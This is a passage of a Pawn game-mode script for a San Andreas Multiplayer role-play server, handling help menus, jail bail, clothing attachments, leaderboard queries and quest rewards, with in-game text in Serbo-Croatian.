																								{4282C0}>> /uniforma: {FFFFFF}Uzimanje i ostavljanje uniforme posla.\n\
																								{4282C0}>> /stopwork: {FFFFFF}Stopiranje posla.\n\
																								{4282C0}>> /quitjob: {FFFFFF}Davanje otkaza", "Zatvori", "");
			            }
			            default: SendErrorMessage(playerid, "Vi nemate posao.");
			        }
			    }
				case 12:
			    {
			        //Vozilo
			        ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Vozilo:",
																								"{FFFFFF}** {4282C0}Vozilo:\n\n\
																								{4282C0}>> /v(ozilo): {FFFFFF}Vozila menu.\n\
																								{4282C0}>> /zamenavozila: {FFFFFF}Zamjena vozila ''kljuc za kljuc'' sa igracem.\n\
																								{4282C0}>> /lock: {FFFFFF}Zakljucavanje vozila.\n\
																								{4282C0}>> /pojas: {FFFFFF}Stavljanje i skidanje pojasa.\n\
																								{4282C0}>> /upali: {FFFFFF}Paljenje vozila.\n\
																								{4282C0}>> /ugasi: {FFFFFF}Gasenje vozila.\n\
																								{4282C0}>> /svetla: {FFFFFF}Paljenje i gasenje svetala.\n\
																								{4282C0}>> /gepek: {FFFFFF}Otvaranje i zatvaranje gepeka.\n\
																								{4282C0}>> /windows: {FFFFFF}Otvaranje i zatvaranje prozora.\n\
																								{4282C0}>> /upalivozilo: {FFFFFF}Paljenje ukradenog vozila.\n\
																								{4282C0}>> /obijbravu: {FFFFFF}Obijanje brave vozila.\n\
																								{4282C0}>> /prekiniobijanje: {FFFFFF}Prekidanje obijanja brave vozila.", "Zatvori", "");
			    }
				case 13:
			    {
			        //Imovina
			        ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Imovina:",
																								"{FFFFFF}** {4282C0}Imovina:\n\n\
																								{4282C0}>> /kupiimovinu: {FFFFFF}Kupovina najblize imovine.\n\
																								{4282C0}>> /imovina: {FFFFFF}Imovina menu.\n\
																								{4282C0}>> /zamenaimovina: {FFFFFF}Zamjena imovine ''kljuc za kljuc'' sa igracem.\n\
																								{4282C0}>> /(un)rentroom: {FFFFFF}Rentanje i unrentanje sobe.\n\
																								{4282C0}>> /knock: {FFFFFF}Kucanje na vrata.", "Zatvori", "");
			    }
				case 14:
			    {
			        //Firma
			        ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Firma:",
																								"{FFFFFF}** {4282C0}Firma:\n\n\
																								{4282C0}>> /kupifirmu: {FFFFFF}Kupovina najblize firme.\n\
																								{4282C0}>> /firma: {FFFFFF}Firma menu.\n\
																								{4282C0}>> /zamenafirmi: {FFFFFF}Zamjena firme ''kljuc za kljuc'' sa igracem.", "Zatvori", "");
			    }
				case 15:
			    {
			        //Torba
			        ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Torba:",
																								"{FFFFFF}** {4282C0}Torba:\n\n\
																								{4282C0}>> /torba: {FFFFFF}Otvaranje torbe.\n\
																								{4282C0}>> /ubaciutorbu: {FFFFFF}Ubacivanje stvari u torbu.", "Zatvori", "");
			    }
				case 16:
			    {
			        //Mobitel
			        ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Mobitel:",
																								"{FFFFFF}** {4282C0}Mobitel:\n\n\
																								{4282C0}>> /call: {FFFFFF}Poziv igraca.\n\
																								{4282C0}>> /(p)pickup: {FFFFFF}Javljanje na mobitel.\n\
																								{4282C0}>> /(h)hangup: {FFFFFF}Prekidanje poziva.\n\
																								{4282C0}>> /sms: {FFFFFF}Slanje sms poruke.\n\
																								{4282C0}>> /togphone: {FFFFFF}Paljenje i gasenje mobitela.", "Zatvori", "");
			    }
				case 17:
			    {
			        //Banka
			        ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Banka:",
																								"{FFFFFF}** {4282C0}Banka:\n\n\
																								{4282C0}>> /balance: {FFFFFF}Provjera stanja na racunu.\n\
																								{4282C0}>> /deposit: {FFFFFF}Ostavljanje para na racun.\n\
																								{4282C0}>> /withdraw: {FFFFFF}Uzimanje para sa racuna.\n\
																								{4282C0}>> /transfer: {FFFFFF}Prebacivanje para igracu.", "Zatvori", "");
			    }
				case 18:
			    {
			        //Bingo
			        ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Bingo:",
																								"{FFFFFF}** {4282C0}Bingo:\n\n\
																								{4282C0}>> /uplatibingo: {FFFFFF}Uplacivanje bingo broja.\n\
																								{4282C0}>> /podignidobitak: {FFFFFF}Podizanje jackpota.\n\
																								{4282C0}>> /mojtiket: {FFFFFF}Provjera vaseg bingo broja.\n\
																								{4282C0}>> /smsbingo: {FFFFFF}Uplacivanje bingo broja putem mobitela.", "Zatvori", "");
				}
				case 19:
			    {
			        //Pljacka
			        ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Pljacka:",
																								"{FFFFFF}** {4282C0}Pljacka:\n\n\
																								{4282C0}>> /knockout: {FFFFFF}Obaranje igraca.\n\
																								{4282C0}>> /tie: {FFFFFF}Vezivanje igraca.\n\
																								{4282C0}>> /kpu: {FFFFFF}Ubacivanje igraca u vozilo.\n\
																								{4282C0}>> /rob: {FFFFFF}Kradja novca od igraca.\n\
																								{4282C0}>> /untie: {FFFFFF}Odvezivanje igraca.", "Zatvori", "");
				}
				case 20:
			    {
			        //Promoter
			        if( PlayerInfo[ playerid ][ xAdmin ] >= 6 || PlayerInfo[ playerid ][ xPromoter ] >= 1 )
					{
				        ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Promoter:",
																								"{FFFFFF}** {4282C0}Promoter 1:\n\n\
																								 {4282C0}>> SPECIAL BONUS: {FFFFFF}Dodatak na placu (1.5k).\n\
																								 {4282C0}>> SPECIAL: {FFFFFF}Anti BH iskljucen.\n\
																								 {4282C0}>> /port: {FFFFFF}Portanje na odredjene lokacije.\n\
																								 {4282C0}>> /g: {FFFFFF}Promoter chat.\n\
																								 {4282C0}>> /(fv)fixveh: {FFFFFF}Popravljanje vozila.\n\
																								 {4282C0}>> /(pveh)promoterveh: {FFFFFF}Promoter vozilo.", "Zatvori", "");

					    if( PlayerInfo[ playerid ][ xAdmin ] >= 6 || PlayerInfo[ playerid ][ xPromoter ] >= 2 )
						{
				        	ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Promoter:",
																									"{FFFFFF}** {4282C0}Promoter 2:\n\n\
																									 {4282C0}>> SPECIAL BONUS: {FFFFFF}Dodatak na placu (2k).\n\
																									 {4282C0}>> SPECIAL: {FFFFFF}Anti BH iskljucen.\n\
																									 {4282C0}>> /port: {FFFFFF}Portanje na odredjene lokacije.\n\
																									 {4282C0}>> /g: {FFFFFF}Promoter chat.\n\
																									 {4282C0}>> /(fv)fixveh: {FFFFFF}Popravljanje vozila.\n\
																									 {4282C0}>> /nitro: {FFFFFF}Dodavanje nitra u vozilo.\n\
																									 {4282C0}>> /rtc: {FFFFFF}Respawnovanje vozila.\n\
																									 {4282C0}>> /(pveh)promoterveh: {FFFFFF}Promoter vozilo.", "Zatvori", "");
					    }
					    if( PlayerInfo[ playerid ][ xAdmin ] >= 6 || PlayerInfo[ playerid ][ xPromoter ] >= 3 )
						{
				        	ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Promoter:",
																									"{FFFFFF}** {4282C0}Promoter 3:\n\n\
																									 {4282C0}>> SPECIAL BONUS: {FFFFFF}Dodatak na placu (2.5k).\n\
																									 {4282C0}>> SPECIAL: {FFFFFF}Anti BH iskljucen.\n\
																									 {4282C0}>> SPECIAL: {FFFFFF}Neam cooldown na /port.\n\
																									 {4282C0}>> /port: {FFFFFF}Portanje na odredjene lokacije.\n\
																									 {4282C0}>> /g: {FFFFFF}Promoter chat.\n\
																									 {4282C0}>> /(fv)fixveh: {FFFFFF}Popravljanje vozila.\n\
																									 {4282C0}>> /nitro: {FFFFFF}Dodavanje nitra u vozilo.\n\
																									 {4282C0}>> /rtc: {FFFFFF}Respawnovanje vozila.\n\
																									 {4282C0}>> /fasttune: {FFFFFF}Brzo tuniranje vozila.\n\
																									 {4282C0}>> /playercc: {FFFFFF}Brise sopstveni chat.\n\
																									 {4282C0}>> /(pveh)promoterveh: {FFFFFF}Promoter vozilo.", "Zatvori", "");
					    }
					    if( PlayerInfo[ playerid ][ xAdmin ] >= 6 || PlayerInfo[ playerid ][ xPromoter ] >= 4 || PlayerInfo[ playerid ] [ xSkriptaRank ] == 5 )
						{
				        	ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - Promoter:",
																									"{FFFFFF}** {4282C0}Head Promoter:\n\n\
																									 {4282C0}>> SPECIAL BONUS: {FFFFFF}Dodatak na placu (3k).\n\
																									 {4282C0}>> SPECIAL: {FFFFFF}Anti BH iskljucen.\n\
																									 {4282C0}>> SPECIAL: {FFFFFF}Neam cooldown na /port.\n\
																									 {4282C0}>> /port: {FFFFFF}Portanje na odredjene lokacije.\n\
																									 {4282C0}>> /g: {FFFFFF}Promoter chat.\n\
																									 {4282C0}>> /(fv)fixveh: {FFFFFF}Popravljanje vozila.\n\
																									 {4282C0}>> /nitro: {FFFFFF}Dodavanje nitra u vozilo.\n\
																									 {4282C0}>> /rtc: {FFFFFF}Respawnovanje vozila.\n\
																									 {4282C0}>> /fasttune: {FFFFFF}Brzo tuniranje vozila.\n\
																									 {4282C0}>> /playercc: {FFFFFF}Brise sopstveni chat.\n\
																									 {4282C0}>> /pskin: {FFFFFF}Specijalni VIP skin.\n\
																									 {4282C0}>> /getcar: {FFFFFF}Porta vozilo do sebe.\n\
																									 {4282C0}>> /mark: {FFFFFF}Oznacava specijalnu lokaciju.\n\
																									 {4282C0}>> /gotomark: {FFFFFF}Porta do specijalne lokacije.\n\
																									 {4282C0}>> /(pveh)promoterveh: {FFFFFF}Promoter vozilo.", "Zatvori", "");
				        }
				    }
					else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
			    }
				case 21:
			    {
			        //YouTuber
			        if( PlayerInfo[ playerid ][ xAdmin ] >= 6 || PlayerInfo[ playerid ][ xYouTuber ] >= 1 )
					{
				        ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - YouTuber:",
																								"{FFFFFF}** {4282C0}YouTuber:\n\n\
																								 {4282C0}>> SPECIAL BONUS: {FFFFFF}Dodatak na placu.\n\
																								 {4282C0}>> SPECIAL: {FFFFFF}Anti BH iskljucen.\n\
																								 {4282C0}>> /port: {FFFFFF}Portanje na odredjene lokacije.\n\
																								 {4282C0}>> /g: {FFFFFF}YouTuber chat.\n\
																								 {4282C0}>> /(fv)fixveh: {FFFFFF}Popravljanje vozila.\n\
																								 {4282C0}>> /ytveh: {FFFFFF}YouTuber vozilo.", "Zatvori", "");

					    if( PlayerInfo[ playerid ][ xAdmin ] >= 6 || PlayerInfo[ playerid ][ xYouTuber ] >= 2 )
						{
				        	ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Pomoc - YouTuber:",
																									"{FFFFFF}** {4282C0}Head YouTuber:\n\n\
																									 {4282C0}>> SPECIAL BONUS: {FFFFFF}Dodatak na placu.\n\
																									 {4282C0}>> /port: {FFFFFF}Portanje na odredjene lokacije.\n\
																									 {4282C0}>> /g: {FFFFFF}YouTuber chat.\n\
																									 {4282C0}>> /(fv)fixveh: {FFFFFF}Popravljanje vozila.\n\
																									 {4282C0}>> /ytveh: {FFFFFF}YouTuber vozilo.\n\
																									 {4282C0}>> /makeyoutuber: {FFFFFF}Postavljanje/skidanje YTera.\n\
																									 {4282C0}>> /smeniytera: {FFFFFF}Skidanje offline YTera.", "Zatvori", "");
					    }
				    }
					else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
			    }
			}
		}
	}
	else if(dialogid == dialog_BAIL)
	{
		if(!response) return 1;
		if(response)
		{
			new const kaucija = PlayerInfo[playerid][xZatvorVreme]*40;
			if(PlayerInfo[playerid][xZlato] < kaucija) return SendErrorMessage(playerid, "Nemate dovoljno zlata za kauciju, potrebno vam je %d.", kaucija);

			PlayerInfo[playerid][xZlato] -= kaucija;
			sql_user_update_integer(playerid, "xZlato", PlayerInfo[playerid][xZlato]);

			SMG_SetPlayerPos(playerid, 1536.2214,-1663.0848,13.5469);
			UcitajObjekte(playerid);
			SetCameraBehindPlayer(playerid);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);

			PlayerInfo[playerid][xZatvor] = 0;
			PlayerInfo[playerid][xZatvorVreme] = 0;

			new q[100];
			mysql_format(mSQL, q, sizeof(q), "UPDATE `users` SET `jail_type` = '0', `jail_time` = '0' WHERE `user_id` = '%d' LIMIT 1", PlayerInfo[playerid][xID]);
			mysql_tquery(mSQL, q );

			SendInfoMessage(playerid, "Platili ste kauciju i izasli iz zatvora, uzivajte u slobodi.");			
		}
	}
	else if(dialogid == dialog_GOVATTACHS)
	{
		if(response)
		{
			switch(listitem)
			{
				case 0:
				{
					ShowModelESelectionMenu(playerid, "Select Armour/Vest", MENU_GOV_ARMVEST, { 19515, 19142, 19904 }, 3, 0.0, -90.0, 0.0);
				}
				case 1:
				{
					new attachs[6];
					attachs[0] = 19520;
					attachs[1] = 19521;
					attachs[2] = 19141;
					attachs[3] = 19200;
					attachs[4] = 19161;
					attachs[5] = 19099;

					ShowModelESelectionMenu(playerid, "Select Hat/Cap/Helmet", MENU_GOV_HATCAPHELMET, attachs, sizeof(attachs), 0.0, -90.0, 0.0);
				}
				case 2:
				{
					if( clothes_info[ playerid ][ x_slot_1_model ] == -1 )
					{
				        SetPlayerAttachedObject( playerid, OBJECT_SLOT_1, 19942, 0, 0.0, 0.0, -0.01, 0, 0, 0, 1.2,1.2,1.2);

				        clothes_info[ playerid ][ x_slot_1_model ] = 19942;
				        EditAttachedObject( playerid, OBJECT_SLOT_1);
				        chosen_clothes_slot[ playerid ] = 1;
				    }
				    else if( clothes_info[ playerid ][ x_slot_2_model ] == -1 )
					{
				        SetPlayerAttachedObject( playerid, OBJECT_SLOT_2, 19942, 0, 0.0, 0.0, -0.01, 0, 0, 0, 1.2,1.2,1.2);

				        clothes_info[ playerid ][ x_slot_2_model ] = 19942;
				        EditAttachedObject( playerid, OBJECT_SLOT_2);
				        chosen_clothes_slot[ playerid ] = 2;
				    }
				    else if( clothes_info[ playerid ][ x_slot_3_model ] == -1 )
					{
				        SetPlayerAttachedObject( playerid, OBJECT_SLOT_3, 19942, 0, 0.0, 0.0, -0.01, 0, 0, 0, 1.2,1.2,1.2);

				        clothes_info[ playerid ][ x_slot_3_model ] = 19942;
				        EditAttachedObject( playerid, OBJECT_SLOT_3);
				        chosen_clothes_slot[ playerid ] = 3;
				    }
				    else if( clothes_info[ playerid ][ x_slot_4_model ] == -1 )
					{
				        SetPlayerAttachedObject( playerid, OBJECT_SLOT_4, 19942, 0, 0.0, 0.0, -0.01, 0, 0, 0, 1.2,1.2,1.2);

				        clothes_info[ playerid ][ x_slot_4_model ] = 19942;
				        EditAttachedObject( playerid, OBJECT_SLOT_4);
				        chosen_clothes_slot[ playerid ] = 4;
				    }
					else return SendErrorMessage( playerid, "Svi slotovi su vam zauzeti." );

		            EditingBody[ playerid ] = true;
		            object_on_player[ playerid ][ chosen_clothes_slot[ playerid ]-1 ] = true;
				}
				case 3:
				{
					if( clothes_info[ playerid ][ x_slot_1_model ] == -1 )
					{
				        SetPlayerAttachedObject( playerid, OBJECT_SLOT_1, 18637, 5, 0.0, 0.0, -0.01, 0, 0, 0, 1.2,1.2,1.2);

				        clothes_info[ playerid ][ x_slot_1_model ] = 18637;
				        EditAttachedObject( playerid, OBJECT_SLOT_1);
				        chosen_clothes_slot[ playerid ] = 1;
				    }
				    else if( clothes_info[ playerid ][ x_slot_2_model ] == -1 )
					{
				        SetPlayerAttachedObject( playerid, OBJECT_SLOT_2, 18637, 5, 0.0, 0.0, -0.01, 0, 0, 0, 1.2,1.2,1.2);

				        clothes_info[ playerid ][ x_slot_2_model ] = 18637;
				        EditAttachedObject( playerid, OBJECT_SLOT_2);
				        chosen_clothes_slot[ playerid ] = 2;
				    }
				    else if( clothes_info[ playerid ][ x_slot_3_model ] == -1 )
					{
				        SetPlayerAttachedObject( playerid, OBJECT_SLOT_3, 18637, 5, 0.0, 0.0, -0.01, 0, 0, 0, 1.2,1.2,1.2);

				        clothes_info[ playerid ][ x_slot_3_model ] = 18637;
				        EditAttachedObject( playerid, OBJECT_SLOT_3);
				        chosen_clothes_slot[ playerid ] = 3;
				    }
				    else if( clothes_info[ playerid ][ x_slot_4_model ] == -1 )
					{
				        SetPlayerAttachedObject( playerid, OBJECT_SLOT_4, 18637, 5, 0.0, 0.0, -0.01, 0, 0, 0, 1.2,1.2,1.2);
				        
				        clothes_info[ playerid ][ x_slot_4_model ] = 18637;
				        EditAttachedObject( playerid, OBJECT_SLOT_4);
				        chosen_clothes_slot[ playerid ] = 4;
				    }
					else return SendErrorMessage( playerid, "Svi slotovi su vam zauzeti." );

		            EditingBody[ playerid ] = true;
		            object_on_player[ playerid ][ chosen_clothes_slot[ playerid ]-1 ] = true;
				}
			}
		}
	}
	else if(dialogid == dialog_TOPLISTA)
	{
		if(response)
		{
			switch(listitem)
			{
				case 0:
				{
					//level
					mysql_tquery(mSQL, "SELECT `level`, `p_name`, `isonline`, `last_login` FROM `users` ORDER BY `level` DESC LIMIT 30", "showTopList", "ii", playerid, 0);
				}
				case 1:
				{
					//sati igre
					mysql_tquery(mSQL, "SELECT `xOnlineSati`, `p_name`, `isonline`, `last_login` FROM `users` ORDER BY `xOnlineSati` DESC LIMIT 30", "showTopList", "ii", playerid, 1);
				}
				case 2:
				{
					//novac
					mysql_tquery(mSQL, "SELECT `money`, `xBRacun`, `p_name`, `isonline`, `last_login` FROM `users` ORDER BY `money` + `xBRacun` DESC LIMIT 30", "showTopList", "ii", playerid, 2);
				}
				case 3:
				{
					//zlato
					mysql_tquery(mSQL, "SELECT `xZlato`, `p_name`, `isonline`, `last_login` FROM `users` ORDER BY `xZlato` DESC LIMIT 30", "showTopList", "ii", playerid, 3);
				}
				case 4:
				{
					//dm
					mysql_tquery(mSQL, "SELECT `dm_event_kills`, `p_name`, `isonline`, `last_login` FROM `users` ORDER BY `dm_event_kills` DESC LIMIT 30", "showTopList", "ii", playerid, 4);
				}
				case 5:
				{
					//tdm
					mysql_tquery(mSQL, "SELECT `cstdm_score`, `p_name`, `isonline`, `last_login` FROM `users` ORDER BY `cstdm_score` DESC LIMIT 30", "showTopList", "ii", playerid, 5);
				}
				case 6:
				{
					//event
					mysql_tquery(mSQL, "SELECT `event_first_place`, `p_name`, `isonline`, `last_login` FROM `users` ORDER BY `event_first_place` DESC LIMIT 30", "showTopList", "ii", playerid, 6);
				}
				case 7:
				{
					//paketici
					mysql_tquery(mSQL, "SELECT `gift`, `p_name`, `isonline`, `last_login` FROM `users` ORDER BY `gift` DESC LIMIT 30", "showTopList", "ii", playerid, 7);
				}
			}
		}
	}
	else if(dialogid == dialog_EASYQUEST)
	{
		if(!response) return 1;
		if(response) 
		{
			switch(listitem) 
			{
				case 0:
				{
					if(questInfo[playerid][qt_EasyQuest][0] == false) return SendErrorMessage(playerid, "Niste rijesili zadatak.");
					if(questInfo[playerid][qt_EasyRewardQuest][0] == true) return SendErrorMessage(playerid, "Vec ste pokupili nagradu za ovaj zadatak.");

					questInfo[playerid][qt_EasyRewardQuest][0] = true;

					KillTimer(QuestTimer[playerid]);
					quest_CreateTDs(playerid, false);

					quest_CreateTDs(playerid, true);
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "PREUZELI STE NAGRADU ~p~ZADATAK BR.1");
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "NAGRADA: ~p~5g zlata");
					QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 2);

					PlayerInfo[ playerid ][ xZlato ] += 5;
				   	sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );
					sql_UpdateQuest(playerid);
				}
				case 1:
				{
					if(questInfo[playerid][qt_EasyQuest][1] == false) return SendErrorMessage(playerid, "Niste rijesili zadatak.");
					if(questInfo[playerid][qt_EasyRewardQuest][1] == true) return SendErrorMessage(playerid, "Vec ste pokupili nagradu za ovaj zadatak.");

					SendInfoMessage(playerid, "Cestitamo, uspjesno se zavrsili zadatak.");
					questInfo[playerid][qt_EasyRewardQuest][1] = true;

					KillTimer(QuestTimer[playerid]);
					quest_CreateTDs(playerid, false);

					quest_CreateTDs(playerid, true);
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "PREUZELI STE NAGRADU ~p~ZADATAK BR.2");
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "NAGRADA: ~p~15g zlata");
					QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 2);

					PlayerInfo[ playerid ][ xZlato ] += 15;
				   	sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );
					sql_UpdateQuest(playerid);
				}
				case 2:
				{
					if(questInfo[playerid][qt_EasyQuest][2] == false) return SendErrorMessage(playerid, "Niste rijesili zadatak.");
					if(questInfo[playerid][qt_EasyRewardQuest][2] == true) return SendErrorMessage(playerid, "Vec ste pokupili nagradu za ovaj zadatak.");

					questInfo[playerid][qt_EasyRewardQuest][2] = true;

					KillTimer(QuestTimer[playerid]);
					quest_CreateTDs(playerid, false);

					quest_CreateTDs(playerid, true);
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "PREUZELI STE NAGRADU ~p~ZADATAK BR.3");
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "NAGRADA: ~p~15g zlata");
					QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 2);

					PlayerInfo[ playerid ][ xZlato ] += 15;
				   	sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );
					sql_UpdateQuest(playerid);
				}
				case 3:
				{
					if(questInfo[playerid][qt_EasyQuest][3] == false) return SendErrorMessage(playerid, "Niste rijesili zadatak.");
					if(questInfo[playerid][qt_EasyRewardQuest][3] == true) return SendErrorMessage(playerid, "Vec ste pokupili nagradu za ovaj zadatak.");

					questInfo[playerid][qt_EasyRewardQuest][3] = true;

					KillTimer(QuestTimer[playerid]);
					quest_CreateTDs(playerid, false);

					quest_CreateTDs(playerid, true);
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "PREUZELI STE NAGRADU ~p~ZADATAK BR.4");
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "NAGRADA: ~p~15g zlata");
					QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 2);

					PlayerInfo[ playerid ][ xZlato ] += 15;
				   	sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );
					sql_UpdateQuest(playerid);
				}
				case 4:
				{
					if(questInfo[playerid][qt_EasyQuest][4] == false) return SendErrorMessage(playerid, "Niste rijesili zadatak.");
					if(questInfo[playerid][qt_EasyRewardQuest][4] == true) return SendErrorMessage(playerid, "Vec ste pokupili nagradu za ovaj zadatak.");

					questInfo[playerid][qt_EasyRewardQuest][4] = true;

					KillTimer(QuestTimer[playerid]);
					quest_CreateTDs(playerid, false);

					quest_CreateTDs(playerid, true);
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "PREUZELI STE NAGRADU ~p~ZADATAK BR.5");
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "NAGRADA: ~p~25g zlata ~w~& ~p~1x respekt");
					QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 2);

					PlayerInfo[ playerid ][ xZlato ] += 25;
				   	sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );
					sql_UpdateQuest(playerid);

		            PlayerInfo[ playerid ][ xRespekt ] += 1;
		            
		            new nxtlevel = PlayerInfo[ playerid ][ xLevel ]+1, expamount = nxtlevel*levelexp;
					if( PlayerInfo[ playerid ][ xRespekt ] >= expamount )
					{
						format( globalstring, sizeof( globalstring ), "~g~LEVEL UP~n~~w~Sada si Level %d", nxtlevel );
						GameTextForPlayer( playerid, globalstring, 5000, 1);
						PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
						PlayerPlayMusic( playerid );
						PlayerInfo[ playerid ][ xLevel ]++;
						SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );
						PlayerInfo[ playerid ][ xPoboljsanja ] += 2;
			            PlayerInfo[ playerid ][ xRespekt ] = 0;
						SCMF( playerid, 0x33CCFFFF, "(LEVELUP): Sada si level {FFFFFF}(%d) {33CCFF}kucaj {FFFFFF}[ /upgrade ] {33CCFF}za neke bonuse.", nxtlevel );
						SCMF( playerid, 0x33CCFFFF, "(LEVELUP): Imas {FFFFFF}(%d) {33CCFF}neiskoristenih upgrade poena.", PlayerInfo[ playerid ][ xPoboljsanja ]);

	                    new q[ 120 ];
						mysql_format( mSQL, q, sizeof(q),
							"UPDATE `users` SET `level` = '%d', `exp` = '%d', `upgrades` = '%d' WHERE `user_id` = '%d' LIMIT 1",
								PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xRespekt ], PlayerInfo[ playerid ][ xPoboljsanja ], PlayerInfo[ playerid ][ xID ] );
						mysql_tquery( mSQL, q );

						if( PlayerInfo[ playerid ][ xLevel ] == 5 || PlayerInfo[ playerid ][ xLevel ] == 10 ) {
						    if( PlayerInfo[ playerid ][ xSlotoviVozila ] < MAX_VEH_SLOT ) {
								PlayerInfo[ playerid ][ xSlotoviVozila ]++;
								SCMF( playerid, ZUTA, "(VOZILO): Dobili ste dodatni slot vozila jer ste presli level {FFFFFF}(%d). {FFFF00}Sada imate {FFFFFF}(%d).", PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xSlotoviVozila ] );

								sql_user_update_integer( playerid, "vehicle_slots", PlayerInfo[ playerid ][ xSlotoviVozila ] );
							}
						}
					}
					else
					{
						sql_user_update_integer( playerid, "exp", PlayerInfo[ playerid ][ xRespekt ] );
					}
				}
				case 5:
				{
					if(questInfo[playerid][qt_EasyQuest][5] == false) return SendErrorMessage(playerid, "Niste rijesili zadatak.");
					if(questInfo[playerid][qt_EasyRewardQuest][5] == true) return SendErrorMessage(playerid, "Vec ste pokupili nagradu za ovaj zadatak.");

					questInfo[playerid][qt_EasyRewardQuest][5] = true;

					KillTimer(QuestTimer[playerid]);
					quest_CreateTDs(playerid, false);

					quest_CreateTDs(playerid, true);
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "PREUZELI STE NAGRADU ~p~ZADATAK BR.6");
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "NAGRADA: ~p~15g zlata ~w~& ~p~4x respekt");
					QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 2);

					PlayerInfo[ playerid ][ xZlato ] += 50;
				   	sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );
					sql_UpdateQuest(playerid);

		            PlayerInfo[ playerid ][ xRespekt ] += 4;
		            
		            new nxtlevel = PlayerInfo[ playerid ][ xLevel ]+1, expamount = nxtlevel*levelexp;
					if( PlayerInfo[ playerid ][ xRespekt ] >= expamount )
					{
						format( globalstring, sizeof( globalstring ), "~g~LEVEL UP~n~~w~Sada si Level %d", nxtlevel );
						GameTextForPlayer( playerid, globalstring, 5000, 1);
						PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
						PlayerPlayMusic( playerid );
						PlayerInfo[ playerid ][ xLevel ]++;
						SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );
						PlayerInfo[ playerid ][ xPoboljsanja ] += 2;
			            PlayerInfo[ playerid ][ xRespekt ] = 0;
						SCMF( playerid, 0x33CCFFFF, "(LEVELUP): Sada si level {FFFFFF}(%d) {33CCFF}kucaj {FFFFFF}[ /upgrade ] {33CCFF}za neke bonuse.", nxtlevel );
						SCMF( playerid, 0x33CCFFFF, "(LEVELUP): Imas {FFFFFF}(%d) {33CCFF}neiskoristenih upgrade poena.", PlayerInfo[ playerid ][ xPoboljsanja ]);

	                    new q[ 120 ];
						mysql_format( mSQL, q, sizeof(q),
							"UPDATE `users` SET `level` = '%d', `exp` = '%d', `upgrades` = '%d' WHERE `user_id` = '%d' LIMIT 1",
								PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xRespekt ], PlayerInfo[ playerid ][ xPoboljsanja ], PlayerInfo[ playerid ][ xID ] );
						mysql_tquery( mSQL, q );

						if( PlayerInfo[ playerid ][ xLevel ] == 5 || PlayerInfo[ playerid ][ xLevel ] == 10 ) 
						{
						    if( PlayerInfo[ playerid ][ xSlotoviVozila ] < MAX_VEH_SLOT ) 
						    {
								PlayerInfo[ playerid ][ xSlotoviVozila ]++;
								SCMF( playerid, ZUTA, "(VOZILO): Dobili ste dodatni slot vozila jer ste presli level {FFFFFF}(%d). {FFFF00}Sada imate {FFFFFF}(%d).", PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xSlotoviVozila ] );

								sql_user_update_integer( playerid, "vehicle_slots", PlayerInfo[ playerid ][ xSlotoviVozila ] );
							}
						}
					}
					else
